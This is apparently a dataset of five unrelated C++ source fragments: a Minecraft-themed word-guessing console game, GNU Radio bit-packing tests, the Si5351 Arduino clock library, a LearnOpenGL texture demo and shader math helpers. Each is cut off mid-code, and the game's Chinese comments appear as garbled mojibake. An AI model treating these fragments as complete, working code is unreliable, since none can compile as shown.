    "#include <bits/stdc++.h>\r\n#include<windows.h>\r\n#include<time.h>\r\n#include<conio.h>\r\nusing namespace std;\r\nstring /*\u00d7\u00d6\u00b5\u00e4*/dic[2000]={\"A Balanced Diet\",\"A Complete Catalogue\",\"A Furious Cocktail\",\"A Seedy Place\",\"A Terrible Fortress\",\"A Throwaway Joke\",\"Acquire Hardware\",\"Adventuring Time\",\"Arbalistic\",\"Beaconator\",\"Bee Our Guest\",\"Best Friends Forever\",\"Birthday Song\",\"Blowback\",\"Bring Home the Beacon\",\"Bullseye\",\"Careful Restoration\",\"Caves & Cliffs\",\"Country Lode, Take Me Home\",\"Cover Me in Debris\",\"Cover Me with Diamonds\",\"Crafters Crafting Crafters\",\"Crafting a New Look\",\"Diamonds\",\"Enchanter\",\"Eye Spy\",\"Feels Like Home\",\"Fishy Business\",\"Free the End\",\"Getting an Upgrade\",\"Glow and Behold\",\"Good as New\",\"Great View From Up Here\",\"Hero of the Village\",\"Hidden in the Depths\",\"Hired Help\",\"Hot Stuff\",\"Hot Tourist Destinations\",\"How Did We Get Here\",\"Husbandry\",\"Ice Bucket Challenge\",\"Into Fire\",\"Is It a Balloon\",\"Is It a Bird\",\"Is It a Plane\",\"Isn't It Iron Pick\",\"Isn't It Scute\",\"It Spreads\",\"Light as a Rabbit\",\"Lighten Up\",\"Little Sniffs\",\"Local Brewery\",\"Minecraft\",\"Monsters Hunted\",\"Nether\",\"Not Today, Thank You\",\"Oh Shiny\",\"Ol' Betsy\",\"Over-Overkill\",\"Planting the Past\",\"Postmortal\",\"Remote Getaway\",\"Respecting the Remnants\",\"Return to Sender\",\"Revaulting\",\"Serious Dedication\",\"Shear Brilliance\",\"Sky's the Limit\",\"Smells Interesting\",\"Smithing with Style\",\"Sneak 100\",\"Sniper Duel\",\"Sound of Music\",\"Spooky Scary Skeleton\",\"Star Trader\",\"Sticky Situation\",\"Stone Age\",\"Subspace Bubble\",\"Suit Up\",\"Surge Protector\",\"Sweet Dreams\",\"Tactical Fishing\",\"Take Aim\",\"The City at the End of the Game\",\"The Cutest Predator\",\"The End\",\"The End... Again...\",\"The End\",\"The Healing Power of Friendship\",\"The Next Generation\",\"The Parrots and the Bats\",\"The Power of Books\",\"The Whole Pack\",\"This Boat Has Legs\",\"Those Were the Days\",\"Total Beelocation\",\"Two Birds, One Arrow\",\"Two by Two\",\"Under Lock and Key\",\"Uneasy Alliance\",\"Very Very Frightening\",\"Voluntary Exile\",\"War Pigs\",\"Wax Off\",\"Wax On\",\"We Need to Go Deeper\",\"What a Deal\",\"Whatever Floats Your Goat\",\"When the Squad Hops into Town\",\"Who Needs Rockets\",\"Who is Cutting Onions\",\"Who's the Pillager Now\",\"With Our Powers Combined\",\"Withering Heights\",\"You Need a Mint\",\"You've Got a Friend in Me\",\"Zombie Doctor\"};\r\nbool used[2000],firstkai=1,correct[2000];\r\nint n=12345678,cnt=1,index,sum=1,guessb;\r\nstring abef[2000];\r\nstring aaft[2000];\r\nstring guess;\r\nchar f,mode,eat;\r\nvector <char>yikai;//\u00d2\u00d1\u00be\u00ad\u00bf\u00aa\u00b9\u00fd\u00b5\u00c4\u00b4\u00ca \r\n\r\nvoid kai(char x){\r\n\tfor(int i=1;i<=n;i++){\r\n\t\tfor(int j=0;j<aaft[i].length();j++){\r\n\t\t\tif(abef[i][j]==x){\r\n\t\t\t\taaft[i][j]=x;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\nvoid sayzm(){\r\n\tfor(int i=1;i<=n;i++){\r\n\t\tcout<<i<<'.';\r\n\t\tfor(int j=0;j<aaft[i].length();j++){\r\n\t\t\tcout<<aaft[i][j];\r\n\t\t}\r\n\t\tif(correct[i]) cout<<\"\u00a3\u00a8\u00d2\u00d1\u00bf\u00aa\u00b6\u00d4\u00a3\u00a9\";\r\n\t\tcout<<endl;\r\n\t}\r\n}\r\nvoid init(){\r\n\tfor(int i=0;i<200;i++){\r\n\t\taaft[i]=\"                                                                \";\r\n\t}\r\n\tcout<<\"\u00c7\u00eb\u00cb\u00b5\u00b3\u00f6\u00b4\u00ca\u00b5\u00c4\u00ca\u00fd\u00c1\u00bf\u00a3\u00ba\"; \r\n\twhile(n>117){\r\n\t\tcin>>n;\r\n\t\tif(n>117) cout<<\"n\u00b5\u00c4\u00ca\u00fd\u00c1\u00bf\u00cc\u00ab\u00b4\u00f3\u00a3\u00ac\u00b1\u00d8\u00d0\u00eb\u00d0\u00a1\u00d3\u00da\u00b5\u00c8\u00d3\u00da117\u00a3\u00a1\"<<endl;\r\n\t}\r\n\tsrand(time(0));\r\n\twhile(cnt<=n){\r\n\t\tindex=rand()%117;//\u00d7\u00d6\u00b5\u00e4\u00d2\u00bb\u00b9\u00b2117\u00b8\u00f6\u00b4\u00ca\u00a3\u00ac\u00cf\u00c2\u00b1\u00ea\u00ce\u00aa0-116\u00a3\u00acrand()%117\u00ca\u00e4\u00b3\u00f6\u00b5\u00c4\u00ca\u00c70-116\u00b5\u00c4\u00cb\u00e6\u00bb\u00fa\u00ca\u00fd \r\n\t\tif(!used[index]){\r\n\t\t\tabef[cnt]=dic[index];\r\n\t\t\tcnt++;\r\n\t\t\tused[index]=1;\r\n\t\t}\r\n\t}\r\n\t\r\n\tfor(int i=1;i<=n;i++){\r\n\t\tcout<<i<<'.';\r\n\t\tfor(int j=0;j<abef[i].length();j++){\r\n\t\t\tif(abef[i][j]!=' '){\r\n\t\t\t\taaft[i][j]='*';\r\n\t\t\t\tcout<<aaft[i][j];\r\n\t\t\t}else{\r\n\t\t\t\taaft[i][j]=' ';\r\n\t\t\t\tcout<<aaft[i][j];\r\n\t\t\t}\r\n\t\t}\r\n\t\tcout<<endl;\r\n\t}\r\n\t//abef\u00ca\u00c7\u00b4\u00d3\u00d7\u00d6\u00b5\u00e4\u00c0\u00ef\u00cb\u00e6\u00bb\u00fa\u00d1\u00a1\u00c8\u00a1\u00b5\u00c4\u00b4\u00ca\u00a3\u00acaaft\u00ca\u00c7\u00bd\u00ab\u00cb\u00fb\u00c3\u00c7\u00d7\u00aa\u00bb\u00bb\u00ce\u00aa\u00c8\u00ab\u00ca\u00c7*\u00ba\u00cd\u00bf\u00d5\u00b8\u00f1\u00d6\u00ae\u00ba\u00f3\u00b5\u00c4\u00b4\u00ca \r\n}\r\nbool dequal(string a,string b){//\u00b4\u00f3\u00d0\u00a1\u00d0\u00b4\u00b2\u00bb\u00c3\u00f4\u00b8\u00d0\u00b5\u00c4\u00c5\u00d0\u00b6\u00cf\u00cf\u00e0\u00b5\u00c8 \r\n\tfor(int i=0;i<a.length();i++){\r\n\t\tif(a[i]>='A' && a[i]<='Z'){\r\n\t\t\ta[i]+='a'-'A';\r\n\t\t}\r\n\t}\r\n\tfor(int i=0;i<b.length();i++){\r\n\t\tif(b[i]>='A' && b[i]<='Z'){\r\n\t\t\tb[i]+='a'-'A';\r\n\t\t}\r\n\t}\r\n\t//\u00c8\u00ab\u00d7\u00aa\u00bb\u00bb\u00b3\u00c9\u00d0\u00a1\u00d0\u00b4\r\n\tif(a==b) return 1;\r\n\treturn 0; \r\n}\r\nint main(){\r\n\t//0-117\r\n\tinit();\r\n\twhile(sum<=n){\r\n\t\tcout<<\"\u00ca\u00e4\u00c8\u00eb1\u00d2\u00d4\u00bf\u00aa\u00d2\u00bb\u00b8\u00f6\u00d7\u00d6\u00c4\u00b8\u00a3\u00ac\u00ca\u00e4\u00c8\u00eb2\u00d2\u00d4\u00b2\u00c2\u00d2\u00bb\u00b8\u00f6\u00b4\u00ca\"<<endl;\r\n\t\tmode=_getch();\r\n\t\tif(mode=='1'){\r\n\t\t\tcout<<\"\u00bf\u00aa\u00ca\u00b2\u00c3\u00b4\u00d7\u00d6\u00c4\u00b8\u00a3\u00bf\"<<endl;\r\n\t\t\tf=_getch();\r\n\t\t\tsystem(\"cls\");//\u00c7\u00e5\u00c6\u00c1 \r\n\t\t\tif((find(yikai.begin(),yikai.end(),f) != yikai.end()) && firstkai==0){\r\n\t\t\t\tcout<<\"\u00d5\u00e2\u00b8\u00f6\u00d7\u00d6\u00c4\u00b8\u00d2\u00d1\u00be\u00ad\u00bf\u00aa\u00b9\u00fd\u00bf\u00a9~\"<<endl;\r\n\t\t\t\tsayzm();\r\n\t\t\t}else{\r\n\t\t\t\tfirstkai=0;\r\n\t\t\t\tyikai.push_back(f);\r\n\t\t\t\tcout<<\"\u00d2\u00d1\u00bf\u00aa\u00a3\u00ba\";\r\n\t\t\t\tfor(int i=0;i<yikai.size();i++){\r\n\t\t\t\t\tcout<<yikai[i]<<' ';\r\n\t\t\t\t}\r\n\t\t\t\tcout<<endl;\r\n\t\t\t\t\r\n\t\t\t\tif(f>='A' && f<='Z'){//\u00c8\u00e7\u00b2\u00c2\u00b5\u00c4\u00ca\u00c7\u00b4\u00f3\u00d0\u00b4\u00d7\u00d6\u00c4\u00b8\u00a3\u00ac\u00d4\u00f2\u00bd\u00ab\u00d0\u00a1\u00d0\u00b4\u00d2\u00bb\u00bf\u00e9\u00bf\u00aa\u00c1\u00cb \r\n\t\t\t\t\tkai(f);\r\n\t\t\t\t\tkai(char(f+'a'-'A'));\r\n\t\t\t\t}else if(f>='a' && f<='z'){//\u00c8\u00e7\u00b2\u00c2\u00b5\u00c4\u00ca\u00c7\u00d0\u00a1\u00d0\u00b4\u00d7\u00d6\u00c4\u00b8\u00a3\u00ac\u00d4\u00f2\u00bd\u00ab\u00b4\u00f3\u00d0\u00b4\u00d2\u00bb\u00bf\u00e9\u00bf\u00aa\u00c1\u00cb \r\n\t\t\t\t\tkai(f);\r\n\t\t\t\t\tkai(char(f-'a'+'A'));\r\n\t\t\t\t}else if(int(f)>32 && int(f)<127){\r\n\t\t\t\t\tkai(f);\r\n\t\t\t\t}else{\r\n\t\t\t\t\tcout<<\"\u00ca\u00e4\u00c8\u00eb\u00ce\u00de\u00d0\u00a7\u00a3\u00a1\"<<endl;\r\n\t\t\t\t}\r\n\t\t\t\tsayzm();\r\n\t\t\t}\r\n\t\t\t\r\n\t\t}else if(mode=='2'){\r\n\t\t\tcout<<\"\u00c7\u00eb\u00ca\u00e4\u00c8\u00eb\u00b1\u00e0\u00ba\u00c5\u00ba\u00cd\u00c4\u00e3\u00b2\u00c2\u00b5\u00c4\u00b4\u00ca\u00a3\u00ac\u00b1\u00d8\u00d0\u00eb\u00d2\u00bb\u00d7\u00d6\u00b2\u00bb\u00b2\u00ee\u00a3\u00a8\u00b5\u00ab\u00ca\u00c7\u00b4\u00f3\u00d0\u00a1\u00d0\u00b4\u00b2\u00bb\u00c3\u00f4\u00b8\u00d0\u00a3\u00a9\"<<endl;\r\n\t\t\tcin>>guessb;\r\n\t\t\tscanf(\"%c\",&eat); //\u00b3\u00d4\u00b5\u00f4\u00d6\u00d0\u00bc\u00e4\u00b5\u00c4\u00bf\u00d5\u00b8\u00f1 \r\n\t\t \tgetline(cin,guess);\r\n\t\t \tif(dequal(abef[guessb],guess)){\r\n\t\t \t\tsystem(\"cls\");\r\n\t\t \t\tcout<<\"\u00b9\u00a7\u00cf\u00b2\u00c4\u00e3\u00b2\u00c2\u00b6\u00d4\u00c1\u00cb\u00a3\u00a1\"<",
    "#include <gnuradio-4.0/Graph.hpp>\n#include <gnuradio-4.0/Scheduler.hpp>\n#include <gnuradio-4.0/packet-modem/pack_bits.hpp>\n#include <gnuradio-4.0/packet-modem/random_source.hpp>\n#include <gnuradio-4.0/packet-modem/unpack_bits.hpp>\n#include <gnuradio-4.0/packet-modem/vector_sink.hpp>\n#include <gnuradio-4.0/packet-modem/vector_source.hpp>\n#include <boost/ut.hpp>\n\nboost::ut::suite PackUnpackTests = [] {\n    using namespace boost::ut;\n    using namespace gr;\n    using namespace gr::packet_modem;\n\n    \"pack_8bits_fixed\"_test = [] {\n        Graph fg;\n        const std::vector<uint8_t> v = {\n            0, 0, 0, 1, 0, 1, 1, 0, //\n            0, 1, 0, 1, 1, 1, 0, 0, //\n            1, 1, 0, 0, 0, 1, 0, 1, //\n            1, 1, 1, 1, 1, 1, 1, 1, //\n            0, 0, 0, 0, 0, 0, 0, 0, //\n            1, 0, 1, 0, 1, 0, 1, 0, //\n            0, 1, 0, 1, 0, 1, 0, 1, //\n        };\n        auto& source = fg.emplaceBlock<VectorSource<uint8_t>>();\n        source.data = v;\n        auto& pack_msb = fg.emplaceBlock<PackBits<>>({ { \"inputs_per_output\", 8UZ } });\n        auto& pack_lsb =\n            fg.emplaceBlock<PackBits<Endianness::LSB>>({ { \"inputs_per_output\", 8UZ } });\n        auto& sink_msb = fg.emplaceBlock<VectorSink<uint8_t>>();\n        auto& sink_lsb = fg.emplaceBlock<VectorSink<uint8_t>>();\n        expect(\n            eq(ConnectionResult::SUCCESS, fg.connect<\"out\">(source).to<\"in\">(pack_msb)));\n        expect(\n            eq(ConnectionResult::SUCCESS, fg.connect<\"out\">(source).to<\"in\">(pack_lsb)));\n        expect(eq(ConnectionResult::SUCCESS,\n                  fg.connect<\"out\">(pack_msb).to<\"in\">(sink_msb)));\n        expect(eq(ConnectionResult::SUCCESS,\n                  fg.connect<\"out\">(pack_lsb).to<\"in\">(sink_lsb)));\n        scheduler::Simple sched{ std::move(fg) };\n        expect(sched.runAndWait().has_value());\n        const std::vector<uint8_t> expected_msb = { 0b0010110,  0b01011100, 0b11000101,\n                                                    0b11111111, 0b00000000, 0b10101010,\n                                                    0b01010101 };\n        const std::vector<uint8_t> expected_lsb = { 0b01101000, 0b00111010, 0b10100011,\n                                                    0b11111111, 0b0000000,  0b01010101,\n                                                    0b10101010 };\n        expect(eq(sink_msb.data(), expected_msb));\n        expect(eq(sink_lsb.data(), expected_lsb));\n    };\n\n    \"pack_8bits_fixed_pdu\"_test = [] {\n        Graph fg;\n        const std::vector<uint8_t> v = {\n            0, 0, 0, 1, 0, 1, 1, 0, //\n            0, 1, 0, 1, 1, 1, 0, 0, //\n            1, 1, 0, 0, 0, 1, 0, 1, //\n            1, 1, 1, 1, 1, 1, 1, 1, //\n            0, 0, 0, 0, 0, 0, 0, 0, //\n            1, 0, 1, 0, 1, 0, 1, 0, //\n            0, 1, 0, 1, 0, 1, 0, 1, //\n        };\n        const Pdu<uint8_t> pdu = { v, {} };\n        auto& source = fg.emplaceBlock<VectorSource<Pdu<uint8_t>>>();\n        source.data = std::vector<Pdu<uint8_t>>{ pdu };\n        auto& pack_msb =\n            fg.emplaceBlock<PackBits<Endianness::MSB, Pdu<uint8_t>, Pdu<uint8_t>>>(\n                { { \"inputs_per_output\", 8UZ } });\n        auto& pack_lsb =\n            fg.emplaceBlock<PackBits<Endianness::LSB, Pdu<uint8_t>, Pdu<uint8_t>>>(\n                { { \"inputs_per_output\", 8UZ } });\n        auto& sink_msb = fg.emplaceBlock<VectorSink<Pdu<uint8_t>>>();\n        auto& sink_lsb = fg.emplaceBlock<VectorSink<Pdu<uint8_t>>>();\n        expect(\n            eq(ConnectionResult::SUCCESS, fg.connect<\"out\">(source).to<\"in\">(pack_msb)));\n        expect(\n            eq(ConnectionResult::SUCCESS, fg.connect<\"out\">(source).to<\"in\">(pack_lsb)));\n        expect(eq(ConnectionResult::SUCCESS,\n                  fg.connect<\"out\">(pack_msb).to<\"in\">(sink_msb)));\n        expect(eq(ConnectionResult::SUCCESS,\n                  fg.connect<\"out\">(pack_lsb).to<\"in\">(sink_lsb)));\n        scheduler::Simple sched{ std::move(fg) };\n        expect(sched.runAndWait().has_value());\n        const std::vector<uint8_t> expected_msb = { 0b0010110,  0b01011100, 0b11000101,\n                                                    0b11111111, 0b00000000, 0b10101010,\n                                                    0b01010101 };\n        const std::vector<uint8_t> expected_lsb = { 0b01101000, 0b00111010, 0b10100011,\n                                                    0b11111111, 0b0000000,  0b01010101,\n                                                    0b10101010 };\n        expect(eq(sink_msb.data().size(), 1_u));\n        expect(eq(sink_lsb.data().size(), 1_u));\n        expect(eq(sink_msb.data().at(0).data, expected_msb));\n        expect(eq(sink_lsb.data().at(0).data, expected_lsb));\n    };\n\n    \"unpack_8bits_fixed\"_test = [] {\n        Graph fg;\n        const std::vector<uint8_t> v = { 0xab, 0x00, 0xff, 0x12, 0x34, 0x55 };\n        auto& source = fg.emplaceBlock<VectorSource<uint8_t>>();\n        source.data = v;\n        auto& unpack_msb =\n            fg.emplaceBlock<UnpackBits<>>({ { \"outputs_per",
    "/*\n * si5351.cpp - Si5351 library for Arduino\n *\n * Copyright (C) 2015 - 2019 Jason Milldrum <milldrum@gmail.com>\n *                           Dana H. Myers <k6jq@comcast.net>\n *\n * Some tuning algorithms derived from clk-si5351.c in the Linux kernel.\n * Sebastian Hesselbarth <sebastian.hesselbarth@gmail.com>\n * Rabeeh Khoury <rabeeh@solid-run.com>\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include <stdint.h>\n\n#include \"Arduino.h\"\n#include \"Wire.h\"\n#include \"si5351.h\"\n\n\n/********************/\n/* Public functions */\n/********************/\n\nSi5351::Si5351(uint8_t i2c_addr):\n\ti2c_bus_addr(i2c_addr)\n{\n\txtal_freq[0] = SI5351_XTAL_FREQ;\n\n\t// Start by using XO ref osc as default for each PLL\n\tplla_ref_osc = SI5351_PLL_INPUT_XO;\n\tpllb_ref_osc = SI5351_PLL_INPUT_XO;\n\tclkin_div = SI5351_CLKIN_DIV_1;\n}\n\n/*\n * init(uint8_t xtal_load_c, uint32_t ref_osc_freq, int32_t corr)\n *\n * Setup communications to the Si5351 and set the crystal\n * load capacitance.\n *\n * xtal_load_c - Crystal load capacitance. Use the SI5351_CRYSTAL_LOAD_*PF\n * defines in the header file\n * xo_freq - Crystal/reference oscillator frequency in 1 Hz increments.\n * Defaults to 25000000 if a 0 is used here.\n * corr - Frequency correction constant in parts-per-billion\n *\n * Returns a boolean that indicates whether a device was found on the desired\n * I2C address.\n *\n */\nbool Si5351::init(uint8_t xtal_load_c, uint32_t xo_freq, int32_t corr)\n{\n\t// Start I2C comms\n\tWire.begin();\n\n\t// Check for a device on the bus, bail out if it is not there\n\tWire.beginTransmission(i2c_bus_addr);\n\tuint8_t reg_val;\n  reg_val = Wire.endTransmission();\n\n\tif(reg_val == 0)\n\t{\n\t\t// Wait for SYS_INIT flag to be clear, indicating that device is ready\n\t\tuint8_t status_reg = 0;\n\t\tdo\n\t\t{\n\t\t\tstatus_reg = si5351_read(SI5351_DEVICE_STATUS);\n\t\t} while (status_reg >> 7 == 1);\n\n\t\t// Set crystal load capacitance\n\t\tsi5351_write(SI5351_CRYSTAL_LOAD, (xtal_load_c & SI5351_CRYSTAL_LOAD_MASK) | 0b00010010);\n\n\t\t// Set up the XO reference frequency\n\t\tif (xo_freq != 0)\n\t\t{\n\t\t\tset_ref_freq(xo_freq, SI5351_PLL_INPUT_XO);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tset_ref_freq(SI5351_XTAL_FREQ, SI5351_PLL_INPUT_XO);\n\t\t}\n\n\t\t// Set the frequency calibration for the XO\n\t\tset_correction(corr, SI5351_PLL_INPUT_XO);\n\n\t\treset();\n\n\t\treturn true;\n\t}\n\telse\n\t{\n\t\treturn false;\n\t}\n}\n\n/*\n * reset(void)\n *\n * Call to reset the Si5351 to the state initialized by the library.\n *\n */\nvoid Si5351::reset(void)\n{\n\t// Initialize the CLK outputs according to flowchart in datasheet\n\t// First, turn them off\n\tsi5351_write(16, 0x80);\n\tsi5351_write(17, 0x80);\n\tsi5351_write(18, 0x80);\n\tsi5351_write(19, 0x80);\n\tsi5351_write(20, 0x80);\n\tsi5351_write(21, 0x80);\n\tsi5351_write(22, 0x80);\n\tsi5351_write(23, 0x80);\n\n\t// Turn the clocks back on...\n\tsi5351_write(16, 0x0c);\n\tsi5351_write(17, 0x0c);\n\tsi5351_write(18, 0x0c);\n\tsi5351_write(19, 0x0c);\n\tsi5351_write(20, 0x0c);\n\tsi5351_write(21, 0x0c);\n\tsi5351_write(22, 0x0c);\n\tsi5351_write(23, 0x0c);\n\n\t// Set PLLA and PLLB to 800 MHz for automatic tuning\n\tset_pll(SI5351_PLL_FIXED, SI5351_PLLA);\n\tset_pll(SI5351_PLL_FIXED, SI5351_PLLB);\n\n\t// Make PLL to CLK assignments for automatic tuning\n\tpll_assignment[0] = SI5351_PLLA;\n\tpll_assignment[1] = SI5351_PLLA;\n\tpll_assignment[2] = SI5351_PLLA;\n\tpll_assignment[3] = SI5351_PLLA;\n\tpll_assignment[4] = SI5351_PLLA;\n\tpll_assignment[5] = SI5351_PLLA;\n\tpll_assignment[6] = SI5351_PLLB;\n\tpll_assignment[7] = SI5351_PLLB;\n\n\tset_ms_source(SI5351_CLK0, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK1, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK2, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK3, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK4, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK5, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK6, SI5351_PLLB);\n\tset_ms_source(SI5351_CLK7, SI5351_PLLB);\n\n\t// Reset the VCXO param\n\tsi5351_write(SI5351_VXCO_PARAMETERS_LOW, 0);\n\tsi5351_write(SI5351_VXCO_PARAMETERS_MID, 0);\n\tsi5351_write(SI5351_VXCO_PARAMETERS_HIGH, 0);\n\n\t// Then reset the PLLs\n\tpll_reset(SI5351_PLLA);\n\tpll_reset(SI5351_PLLB);\n\n\t// Set initial frequencies\n\tuint8_t i;\n\tfor(i = 0; i < 8; i++)\n\t{\n\t\tclk_freq[i] = 0;\n\t\toutput_enable((enum si5351_clock)i, 0);\n\t\tclk_first_set[i] = false;\n\t}\n}\n\n/*\n * set_freq(uint64_t freq, enum si5351_clock clk)\n *\n * Sets the clock frequency of the specified CLK output.\n * Frequency range of 8 kHz to 150 MHz\n *\n * freq - Output frequency in Hz\n * clk - Clock output\n *   (use the si5351_clock enum)\n *",
    "/*\ng++ 2.5_arrows.cpp ./glad/glad.c -I. -o compiledFile -lglfw -lGL -lX11 -lpthread -lXrandr -lXi -ldl\n*/\n\n#include <glad/glad.h>\n#include <GLFW/glfw3.h>\n#define STB_IMAGE_IMPLEMENTATION\n#include \"stb_image.h\"\n\n#include <shader_s.h>\n#include <filesystem>\n#include <iostream>\n\nvoid framebuffer_size_callback(GLFWwindow* window, int width, int height);\nvoid processInput(GLFWwindow *window);\n\n// settings\nconst unsigned int SCR_WIDTH = 800;\nconst unsigned int SCR_HEIGHT = 600;\n\nfloat perc = 0.3;\n\nint main()\n{\n    // glfw: initialize and configure\n    // ------------------------------\n    glfwInit();\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n\n#ifdef __APPLE__\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);\n#endif\n\n    // glfw window creation\n    // --------------------\n    GLFWwindow* window = glfwCreateWindow(SCR_WIDTH, SCR_HEIGHT, \"LearnOpenGL\", NULL, NULL);\n    if (window == NULL)\n    {\n        std::cout << \"Failed to create GLFW window\" << std::endl;\n        glfwTerminate();\n        return -1;\n    }\n    glfwMakeContextCurrent(window);\n    glfwSetFramebufferSizeCallback(window, framebuffer_size_callback);\n\n    // glad: load all OpenGL function pointers\n    // ---------------------------------------\n    if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress))\n    {\n        std::cout << \"Failed to initialize GLAD\" << std::endl;\n        return -1;\n    }\n\n    // build and compile our shader zprogram\n    // ------------------------------------\n    Shader ourShader(\"2.5_arrows.vs\", \"2.5_arrows.fs\");\n\n    // set up vertex data (and buffer(s)) and configure vertex attributes\n    // ------------------------------------------------------------------\n    float vertices[] = {\n        // positions          // colors           // texture coords\n         0.5f,  0.5f, 0.0f,   1.0f, 0.0f, 0.0f,   1.0f, 1.0f, // top right\n         0.5f, -0.5f, 0.0f,   0.0f, 1.0f, 0.0f,   1.0f, 0.0f, // bottom right\n        -0.5f, -0.5f, 0.0f,   0.0f, 0.0f, 1.0f,   0.0f, 0.0f, // bottom left\n        -0.5f,  0.5f, 0.0f,   1.0f, 1.0f, 0.0f,   0.0f, 1.0f  // top left \n    };\n    unsigned int indices[] = {\n        0, 1, 3, // first triangle\n        1, 2, 3  // second triangle\n    };\n    unsigned int VBO, VAO, EBO;\n    glGenVertexArrays(1, &VAO);\n    glGenBuffers(1, &VBO);\n    glGenBuffers(1, &EBO);\n\n    glBindVertexArray(VAO);\n\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\n    glBufferData(GL_ARRAY_BUFFER, sizeof(vertices), vertices, GL_STATIC_DRAW);\n\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, EBO);\n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, sizeof(indices), indices, GL_STATIC_DRAW);\n\n    // position attribute\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 8 * sizeof(float), (void*)0);\n    glEnableVertexAttribArray(0);\n    // color attribute\n    glVertexAttribPointer(1, 3, GL_FLOAT, GL_FALSE, 8 * sizeof(float), (void*)(3 * sizeof(float)));\n    glEnableVertexAttribArray(1);\n    // texture coord attribute\n    glVertexAttribPointer(2, 2, GL_FLOAT, GL_FALSE, 8 * sizeof(float), (void*)(6 * sizeof(float)));\n    glEnableVertexAttribArray(2);\n\n\n    // load and create a texture \n    // -------------------------\n    unsigned int texture1, texture2;\n    // texture 1\n    // ---------\n    glGenTextures(1, &texture1);\n    glBindTexture(GL_TEXTURE_2D, texture1); \n     // set the texture wrapping parameters\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\t// set texture wrapping to GL_REPEAT (default wrapping method)\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    // set texture filtering parameters\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n    // load image, create texture and generate mipmaps\n    int width, height, nrChannels;\n    stbi_set_flip_vertically_on_load(true); // tell stb_image.h to flip loaded texture's on the y-axis.\n    // The FileSystem::getPath(...) is part of the GitHub repository so we can find files on any IDE/platform; replace it with your own image path.\n    unsigned char *data = stbi_load(\"container.jpg\", &width, &height, &nrChannels, 0);\n    if (data)\n    {\n        glTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, width, height, 0, GL_RGB, GL_UNSIGNED_BYTE, data);\n        glGenerateMipmap(GL_TEXTURE_2D);\n    }\n    else\n    {\n        std::cout << \"Failed to load texture\" << std::endl;\n    }\n    stbi_image_free(data);\n    // texture 2\n    // ---------\n    glGenTextures(1, &texture2);\n    glBindTexture(GL_TEXTURE_2D, texture2);\n    // set the texture wrapping parameters\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\t// set texture wrapping to GL_REPEAT (default wrapping method)\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    // set texture filtering parameters\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n    glTexParameteri(GL",
    "// Copyright 2024 by Owen Bulka.\n// All rights reserved.\n// This file is released under the \"MIT License Agreement\".\n// Please see the LICENSE.md file that should have been included as part\n// of this package.\n\n\n//\n// Math operations\n//\n\n\n/**\n * Compute the fractional portion of the value. Ex. 3.5 returns 0.5\n *\n * @arg value: The value to get the fractional portion of.\n *\n * @returns: The fractional portion of the value.\n */\ninline float fract(const float value)\n{\n    return value - floor(value);\n}\n\n\n/**\n * Multiply a 4d vector by a 4x4 matrix.\n *\n * @arg m: The matrix that will transform the vector.\n * @arg v: The vector to transform.\n * @arg out: The location to store the resulting vector.\n */\ninline void matmul(const float4x4 &m, const float4 &v, float4 &out)\n{\n    for (int i=0; i < 4; i++)\n    {\n        out[i] = 0;\n\n        for (int j=0; j < 4; j++)\n        {\n            out[i] += m[i][j] * v[j];\n        }\n    }\n}\n\n\n/**\n * Multiply a 4d vector by a 4x4 matrix.\n *\n * @arg m: The matrix that will transform the vector.\n * @arg v: The vector to transform.\n * @arg out: The location to store the resulting vector.\n */\ninline float4 matmul(const float4x4 &m, const float4 &v)\n{\n    float4 out;\n    for (int i=0; i < 4; i++)\n    {\n        out[i] = 0;\n\n        for (int j=0; j < 4; j++)\n        {\n            out[i] += m[i][j] * v[j];\n        }\n    }\n\n    return out;\n}\n\n\n/**\n * Multiply a 3d vector by a 3x3 matrix.\n *\n * @arg m: The matrix that will transform the vector.\n * @arg v: The vector to transform.\n * @arg out: The location to store the resulting vector.\n */\ninline float3 matmul(const float3x3 &m, const float3 &v)\n{\n    return float3(\n        m[0][0] * v.x + m[0][1] * v.y + m[0][2] * v.z,\n        m[1][0] * v.x + m[1][1] * v.y + m[1][2] * v.z,\n        m[2][0] * v.x + m[2][1] * v.y + m[2][2] * v.z\n    );\n}\n\n\n/**\n * Convert the uv position in a latlong image to angles.\n *\n * @arg uvPosition: The UV position.\n *\n * @returns: The equivalent angles in radians.\n */\ninline float2 uvPositionToAngles(const float2 